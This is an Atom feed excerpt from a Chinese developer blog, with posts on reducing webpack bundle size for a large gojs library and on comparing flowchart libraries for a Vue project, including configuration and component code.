<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>圆玉的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lry1994.github.io/"/>
  <updated>2018-09-03T02:15:30.625Z</updated>
  <id>http://lry1994.github.io/</id>
  
  <author>
    <name>Ruiyu Lin</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>库文件太大，webpack打包时怎么办</title>
    <link href="http://lry1994.github.io/study/2018/9/bigfile-webpack.html"/>
    <id>http://lry1994.github.io/study/2018/9/bigfile-webpack.html</id>
    <published>2018-09-02T16:00:00.000Z</published>
    <updated>2018-09-03T02:15:30.625Z</updated>
    
    <content type="html"><![CDATA[<p>针对上篇gojs太大的问题的衍生出大文件打包的问题</p><h3 id="exclude-设置不通过babel-loader编译的目录"><a href="#exclude-设置不通过babel-loader编译的目录" class="headerlink" title="exclude 设置不通过babel-loader编译的目录"></a>exclude 设置不通过babel-loader编译的目录</h3><p>写成从node_modules导入的，就不会出现run慢或者报错，还很快。这是为什么?<br>是因为node_modules里面不会再实时编译了<br>那有没有方法，webpack可以设置一些不实时编译的文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">        include: [resolve(<span class="string">'src'</span>)],</span><br><span class="line">        exclude:[</span><br><span class="line">          resolve(<span class="string">"src/components/common/gojs"</span>)</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure></p><p>exclude可以排除目录 ，不用babel-loader编译</p><p>库很大，要么分包 ，或异步加载，或单独引入，否则生成环境打的包会很大</p><h3 id="externals设置不打包的文件"><a href="#externals设置不打包的文件" class="headerlink" title="externals设置不打包的文件"></a>externals设置不打包的文件</h3><p>打包的时候不打包这个，然后需要在生产环境页面单独引入这个script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">externals:&#123;</span><br><span class="line">    <span class="string">'go'</span>:<span class="string">'go'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./static/js/go.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="add-asset-html-webpack-plugin"><a href="#add-asset-html-webpack-plugin" class="headerlink" title="add-asset-html-webpack-plugin"></a>add-asset-html-webpack-plugin</h3><p>add-asset-html-webpack-plugin，可以配置修改打包后的index.html.<br>在webpack.prod.config中引入并添加，用法如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> AddAssetHtmlPlugin(&#123;</span><br><span class="line">    filepath:path.join(__dirname,<span class="string">'src/components/common/gojs/go.js'</span>),</span><br><span class="line">    outputPath:<span class="string">'./static/js'</span>,</span><br><span class="line">    publicPath:<span class="string">'./static/js'</span>,<span class="comment">//script标签中的路径前缀</span></span><br><span class="line">    includeSourcemap:<span class="literal">false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>打包后结果如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./static/js/go.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="CommonsChunkPlugin分包，HtmlWebpackPlugin插入"><a href="#CommonsChunkPlugin分包，HtmlWebpackPlugin插入" class="headerlink" title="CommonsChunkPlugin分包，HtmlWebpackPlugin插入"></a>CommonsChunkPlugin分包，HtmlWebpackPlugin插入</h3><p>分包等的时间久点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> chunks = [<span class="string">'manifest'</span>, <span class="string">'vendor'</span>, <span class="string">'gojs'</span>, <span class="string">'app'</span>];</span><br><span class="line"><span class="keyword">new</span> webpack.optimize.CommonsChunkPlugin(&#123;</span><br><span class="line">      name: <span class="string">'gojs'</span>,</span><br><span class="line">      minChunks (<span class="built_in">module</span>) &#123;</span><br><span class="line">        <span class="comment">// any required modules inside node_modules are extracted to vendor</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          <span class="built_in">module</span>.resource &amp;&amp;</span><br><span class="line">          /go\.js$/.test(<span class="built_in">module</span>.resource) === <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line"> <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      filename: config.build.index,</span><br><span class="line">      template: <span class="string">'index.html'</span>,</span><br><span class="line">      inject: <span class="literal">true</span>,</span><br><span class="line">      minify: &#123;</span><br><span class="line">        removeComments: <span class="literal">true</span>,</span><br><span class="line">        collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">        removeAttributeQuotes: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      chunks,</span><br><span class="line">      chunksSortMode: <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> chunks.indexOf(a.names[<span class="number">0</span>]) - chunks.indexOf(b.names[<span class="number">0</span>])</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;),</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;针对上篇gojs太大的问题的衍生出大文件打包的问题&lt;/p&gt;
&lt;h3 id=&quot;exclude-设置不通过babel-loader编译的目录&quot;&gt;&lt;a href=&quot;#exclude-设置不通过babel-loader编译的目录&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>vue中使用gojs/jointjs</title>
    <link href="http://lry1994.github.io/study/2018/8/procedure.html"/>
    <id>http://lry1994.github.io/study/2018/8/procedure.html</id>
    <published>2018-08-22T16:00:00.000Z</published>
    <updated>2018-08-30T02:31:18.232Z</updated>
    
    <content type="html"><![CDATA[<p>因为公司项目需求，要画出相关业务的流程图，以便客户了解自己身处何处</p><p>搜索框输入 “前端流程图插件”，查了很多资料，总结一下有以下几种</p><h3 id="Raphael"><a href="#Raphael" class="headerlink" title="Raphael"></a>Raphael</h3><p><a href="http://dmitrybaranovskiy.github.io/raphael/reference.html" target="_blank" rel="noopener">http://dmitrybaranovskiy.github.io/raphael/reference.html</a><br>这个星星很多，但是我找到的demo都要自己设置x坐标，y坐标，找不到自动布局的demo</p><p><a href="http://www.weixuehao.com/archives/370" target="_blank" rel="noopener">http://www.weixuehao.com/archives/370</a></p><h3 id="flow-chart"><a href="#flow-chart" class="headerlink" title="flow-chart"></a>flow-chart</h3><p>代码写法繁琐，不是json就可以解决，效果也比较丑,PASS</p><h3 id="darge-d3"><a href="#darge-d3" class="headerlink" title="darge-d3"></a>darge-d3</h3><p>github :<a href="https://github.com/dagrejs/dagre-d3" target="_blank" rel="noopener">https://github.com/dagrejs/dagre-d3</a></p><p>效果图<br><img src="/study/2018/8/procedure/darge-d3.png"></p><p>下载里面的demo,改一下json就可以了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// States </span><br><span class="line">var states = [ "NEW", "SUBMITTED","FINISHED" ,"FAILED","DELIVER", </span><br><span class="line">               "CANCELED", "ABOLISHED" , "DELETED","REFUNDING","REFUNDED"];</span><br><span class="line">var map = ['新创建','已提交','已完成','提交失败',"交付中",</span><br><span class="line">              '已取消','废除','已删除','退款中',"已退款"]</span><br><span class="line">// Automatically label each of the nodes</span><br><span class="line">states.forEach(function(state,index) &#123; g.setNode(state, &#123; label: `$&#123;map[index]&#125;($&#123;state&#125;)`&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">// Set up the edges</span><br><span class="line">g.setEdge("NEW", "FAILED",     &#123; label: "后台接口自动"&#125;);</span><br><span class="line">g.setEdge("NEW", "SUBMITTED",   &#123; label: "后台接口自动" &#125;);</span><br><span class="line">g.setEdge("NEW", "CANCELED",   &#123; label: "用户取消订单" &#125;);</span><br><span class="line">g.setEdge("SUBMITTED","CANCELED",     &#123; label: "用户取消订单" &#125;);</span><br><span class="line">g.setEdge("SUBMITTED", "ABOLISHED",  &#123; label: "用户超过48小时未支付，\n系统自动取消"&#125;);</span><br><span class="line">g.setEdge("ABOLISHED","DELETED",      &#123; label: "已删除" &#125;);</span><br><span class="line">g.setEdge("CANCELED", "DELETED",   &#123; label: "已删除"&#125;);</span><br><span class="line">g.setEdge("FAILED",   "SUBMITTED",      &#123; label: "后台接口自动" &#125;);</span><br><span class="line"></span><br><span class="line">g.setEdge("SUBMITTED",   "DELIVER",     &#123; label: "用户支付" &#125;);</span><br><span class="line">g.setEdge("FINISHED",   "REFUNDING",     &#123; label: "用户退款" &#125;);</span><br><span class="line"></span><br><span class="line">g.setEdge("DELIVER",   "FINISHED",     &#123; label: "交付完成" &#125;);</span><br><span class="line">g.setEdge("REFUNDING",   "REFUNDED",     &#123; label: "已退款" &#125;);</span><br><span class="line">g.setEdge("REFUNDED",   "DELETED",     &#123; label: "已删除" &#125;);</span><br><span class="line">g.setEdge("DELIVER",   "REFUNDING",     &#123; label: "用户退款" &#125;);</span><br><span class="line">g.setEdge("FAILED",   "CANCELED",     &#123; label: "用户取消订单" &#125;);</span><br></pre></td></tr></table></figure></p><p><strong>不满意的地方</strong>：画出来的图是垂直方向的，我要的是水平方向,PASS</p><h3 id="gojs"><a href="#gojs" class="headerlink" title="gojs"></a>gojs</h3><p>github :<a href="https://github.com/NorthwoodsSoftware/GoJS" target="_blank" rel="noopener">https://github.com/NorthwoodsSoftware/GoJS</a></p><p>可以通过<code>npm install gojs -save</code>安装</p><p>效果图<br><img src="/study/2018/8/procedure/gojs.png"></p><p>看里面的demo我自己包装了一下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background-color:#d5d5d5;margin:0;padding:5px;"</span>&gt;</span></span><br><span class="line">    您当前处于 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>用户提交资料<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 步骤 </span><br><span class="line">    下一步等待<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>供应商接单<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-if</span>=<span class="string">"show===false"</span> @<span class="attr">click</span>=<span class="string">"show=true"</span>&gt;</span>展开<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-else</span> @<span class="attr">click</span>=<span class="string">"show=false"</span>&gt;</span>收起<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myDiagramDiv"</span> <span class="attr">v-show</span>=<span class="string">"show"</span>  &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.tip</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">color</span><span class="selector-pseudo">:red</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">font-size</span><span class="selector-pseudo">:0.8em</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">font-weight</span><span class="selector-pseudo">:bold</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">padding</span><span class="selector-pseudo">:5px</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-id">#myDiagramDiv</span>&#123;</span></span><br><span class="line"><span class="undefined">  height: 200px; </span></span><br><span class="line"><span class="css">  <span class="selector-tag">border</span>: <span class="selector-tag">solid</span> 1<span class="selector-tag">px</span> <span class="selector-id">#d3d3d3</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.go =<span class="built_in">require</span>(<span class="string">'./go.js'</span>) </span><br><span class="line"><span class="keyword">var</span> $ = go.GraphObject.make;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datam <span class="keyword">from</span> <span class="string">'./data'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">  mixins:[datam],</span><br><span class="line">  data()&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">      myDiagram:<span class="literal">null</span>,</span><br><span class="line">      show:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted()&#123;</span><br><span class="line">    <span class="keyword">this</span>.load();</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    load()&#123;</span><br><span class="line">      <span class="keyword">this</span>.init();</span><br><span class="line">      <span class="keyword">this</span>.addNodeTemplate(<span class="keyword">this</span>.User);</span><br><span class="line">      <span class="keyword">this</span>.addNodeTemplate(<span class="keyword">this</span>.Supplier);</span><br><span class="line">      <span class="keyword">this</span>.layout();</span><br><span class="line">    &#125;,</span><br><span class="line">    layout() &#123;</span><br><span class="line">      <span class="keyword">this</span>.myDiagram.model = go.Model.fromJson(<span class="keyword">this</span>.myjson);</span><br><span class="line">      <span class="keyword">this</span>.myDiagram.layoutDiagram(<span class="literal">true</span>);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    getOption()&#123;</span><br><span class="line">      <span class="comment">// for conciseness in defining templates</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> options=&#123;</span><br><span class="line">        yellowgrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"rgb(254, 201, 0)"</span>, <span class="number">1</span>: <span class="string">"rgb(254, 162, 0)"</span> &#125;),</span><br><span class="line">        greengrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#98FB98"</span>, <span class="number">1</span>: <span class="string">"#9ACD32"</span> &#125;),</span><br><span class="line">        bluegrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#B0E0E6"</span>, <span class="number">1</span>: <span class="string">"#87CEEB"</span> &#125;),</span><br><span class="line">        redgrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#C45245"</span>, <span class="number">1</span>: <span class="string">"#871E1B"</span> &#125;),</span><br><span class="line">        whitegrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#F0F8FF"</span>, <span class="number">1</span>: <span class="string">"#E6E6FA"</span> &#125;),</span><br><span class="line">        bigfont : <span class="string">"bold 8pt Helvetica, Arial, sans-serif"</span>,</span><br><span class="line">        smallfont : <span class="string">"bold 6pt Helvetica, Arial, sans-serif"</span>,</span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> options;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">     textStyle()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          margin: <span class="number">6</span>,</span><br><span class="line">          wrap: go.TextBlock.WrapFit,</span><br><span class="line">          textAlign: <span class="string">"center"</span>,</span><br><span class="line">          editable: <span class="literal">true</span>,</span><br><span class="line">          font: <span class="keyword">this</span>.getOption()[<span class="string">'bigfont'</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      init()&#123;</span><br><span class="line">        <span class="keyword">this</span>.myDiagram =</span><br><span class="line">            $(go.Diagram, <span class="string">"myDiagramDiv"</span>,</span><br><span class="line">              &#123;</span><br><span class="line">                isReadOnly: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// have mouse wheel events zoom in and out instead of scroll up and down</span></span><br><span class="line">                <span class="string">"toolManager.mouseWheelBehavior"</span>: go.ToolManager.WheelNone,</span><br><span class="line">                initialAutoScale: go.Diagram.Uniform,</span><br><span class="line">                <span class="string">"linkingTool.direction"</span>: go.LinkingTool.ForwardsOnly,</span><br><span class="line">                initialContentAlignment: go.Spot.Center,</span><br><span class="line">                layout: $(go.LayeredDigraphLayout, &#123; <span class="attr">isInitial</span>: <span class="literal">false</span>, <span class="attr">isOngoing</span>: <span class="literal">false</span>, <span class="attr">layerSpacing</span>: <span class="number">50</span> &#125;),</span><br><span class="line">                <span class="string">"undoManager.isEnabled"</span>: <span class="literal">true</span></span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="comment">//默认节点模板</span></span><br><span class="line">        <span class="keyword">this</span>.myDiagram.nodeTemplate =</span><br><span class="line">            $(go.Node, <span class="string">"Auto"</span>,</span><br><span class="line">              <span class="keyword">new</span> go.Binding(<span class="string">"location"</span>, <span class="string">"loc"</span>, go.Point.parse).makeTwoWay(go.Point.stringify),</span><br><span class="line">              <span class="comment">// define the node's outer shape, which will surround the TextBlock</span></span><br><span class="line">              $(go.Shape, <span class="string">"Rectangle"</span>,</span><br><span class="line">                &#123; <span class="attr">fill</span>: <span class="keyword">this</span>.getOption()[<span class="string">'yellowgrad'</span>], <span class="attr">stroke</span>: <span class="string">"black"</span>,</span><br><span class="line">                  portId: <span class="string">""</span>, <span class="attr">fromLinkable</span>: <span class="literal">true</span>, <span class="attr">toLinkable</span>: <span class="literal">true</span>, <span class="attr">cursor</span>: <span class="string">"pointer"</span>,</span><br><span class="line">                  toEndSegmentLength: <span class="number">50</span>, <span class="attr">fromEndSegmentLength</span>: <span class="number">40</span> &#125;),</span><br><span class="line">              $(go.TextBlock, <span class="string">"Page"</span>,</span><br><span class="line">                &#123; <span class="attr">margin</span>: <span class="number">6</span>,</span><br><span class="line">                  font: <span class="keyword">this</span>.getOption()[<span class="string">'bigfont'</span>],</span><br><span class="line">                  editable: <span class="literal">true</span> &#125;,</span><br><span class="line">                <span class="keyword">new</span> go.Binding(<span class="string">"text"</span>, <span class="string">"text"</span>).makeTwoWay()));</span><br><span class="line">            <span class="comment">// replace the default Link template in the linkTemplateMap</span></span><br><span class="line">          <span class="keyword">this</span>.myDiagram.linkTemplate =</span><br><span class="line">                $(go.Link,  <span class="comment">// the whole link panel</span></span><br><span class="line">                  <span class="keyword">new</span> go.Binding(<span class="string">"points"</span>).makeTwoWay(),</span><br><span class="line">                  &#123; <span class="attr">curve</span>: go.Link.Bezier, <span class="attr">toShortLength</span>: <span class="number">15</span> &#125;,</span><br><span class="line">                  <span class="keyword">new</span> go.Binding(<span class="string">"curviness"</span>, <span class="string">"curviness"</span>),</span><br><span class="line">                  $(go.Shape,  <span class="comment">// the link shape</span></span><br><span class="line">                    &#123; <span class="attr">stroke</span>: <span class="string">"#2F4F4F"</span>, <span class="attr">strokeWidth</span>: <span class="number">2.5</span> &#125;),</span><br><span class="line">                  $(go.Shape,  <span class="comment">// the arrowhead</span></span><br><span class="line">                    &#123; <span class="attr">toArrow</span>: <span class="string">"kite"</span>, <span class="attr">fill</span>: <span class="string">"#2F4F4F"</span>, <span class="attr">stroke</span>: <span class="literal">null</span>, <span class="attr">scale</span>: <span class="number">2</span> &#125;)</span><br><span class="line">                  );</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * options:&#123;</span></span><br><span class="line"><span class="comment">       *  category</span></span><br><span class="line"><span class="comment">       *  shape:RoundedRectangle/Rectangle</span></span><br><span class="line"><span class="comment">       *  shapeOptions:&#123;</span></span><br><span class="line"><span class="comment">       *   fill:bluegrad/greengrad/yellowgrad/null/redgrad/whitegrad  自定义的</span></span><br><span class="line"><span class="comment">       *   stroke: "black",</span></span><br><span class="line"><span class="comment">       *   portId:""</span></span><br><span class="line"><span class="comment">       *   fromLinkable:true</span></span><br><span class="line"><span class="comment">       *   toLinkable:</span></span><br><span class="line"><span class="comment">       *   cursor:"pointer"</span></span><br><span class="line"><span class="comment">       *   fromEndSegmentLength:40</span></span><br><span class="line"><span class="comment">       *    toEndSegmentLength</span></span><br><span class="line"><span class="comment">       *    strokeWidth</span></span><br><span class="line"><span class="comment">       *  </span></span><br><span class="line"><span class="comment">       *   &#125;</span></span><br><span class="line"><span class="comment">       *    textStyle:&#123;</span></span><br><span class="line"><span class="comment">       *        margin: 9,</span></span><br><span class="line"><span class="comment">       *        maxSize: new go.Size(200, NaN),</span></span><br><span class="line"><span class="comment">       *        wrap: go.TextBlock.WrapFit,</span></span><br><span class="line"><span class="comment">        *       editable: true,</span></span><br><span class="line"><span class="comment">        *       textAlign: "center",</span></span><br><span class="line"><span class="comment">        *       font: smallfont </span></span><br><span class="line"><span class="comment">        * &#125;,</span></span><br><span class="line"><span class="comment">       *    </span></span><br><span class="line"><span class="comment">       * &#125;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      addNodeTemplate(options)&#123;</span><br><span class="line">        <span class="keyword">let</span> fill = <span class="keyword">this</span>.getOption()[options.shapeOptions.fill];</span><br><span class="line">        options.shapeOptions.fill = fill;</span><br><span class="line">        <span class="keyword">this</span>.myDiagram.nodeTemplateMap.add(options.category,</span><br><span class="line">          $(go.Node, <span class="string">"Auto"</span>,</span><br><span class="line">            <span class="keyword">new</span> go.Binding(<span class="string">"location"</span>, <span class="string">"loc"</span>, go.Point.parse).makeTwoWay(go.Point.stringify),</span><br><span class="line">            $(go.Shape, options.shape,options.shapeOptions),</span><br><span class="line">            $(go.TextBlock,  <span class="keyword">this</span>.textStyle(),</span><br><span class="line">              <span class="keyword">new</span> go.Binding(<span class="string">"text"</span>, <span class="string">"text"</span>).makeTwoWay())</span><br><span class="line">            ));</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>不满意的地方</strong>：</p><ol><li>免费版gojs是有水印的，百度搜索“gojs如何去水印”有一堆答案，我就不写了。</li><li>因为要自己手动去掉水印，所以我只能手动下载go.js放在我自己的组件目录下，但是这个文件太大了，800+KB,<br>npm run dev 的时候停在这里停了好久。有时候还爆出“……maximun ….500KB”的错误，我也不知道是什么原因，不知道有什么方法，有的话麻烦通知我。</li><li>代码写法有点太繁琐</li></ol><p>这是我自己包装的代码地址：<a href="https://github.com/LRY1994/vue-lib/tree/master/src/components/process-go" target="_blank" rel="noopener">https://github.com/LRY1994/vue-lib/tree/master/src/components/process-go</a></p><h3 id="jointjs"><a href="#jointjs" class="headerlink" title="jointjs"></a>jointjs</h3><p>github : <a 